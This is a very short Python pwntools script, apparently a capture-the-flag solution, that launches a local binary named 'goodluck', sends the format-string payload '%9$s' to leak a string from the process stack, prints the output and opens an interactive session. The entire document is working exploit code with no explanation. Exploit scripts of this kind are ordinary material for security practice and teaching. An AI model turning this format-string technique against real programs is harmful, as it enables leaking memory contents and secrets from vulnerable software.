from pwn import *

p = process('./goodluck')

playload = '%9$s'
p.sendline(playload)
print p.recv()
p.interactive()
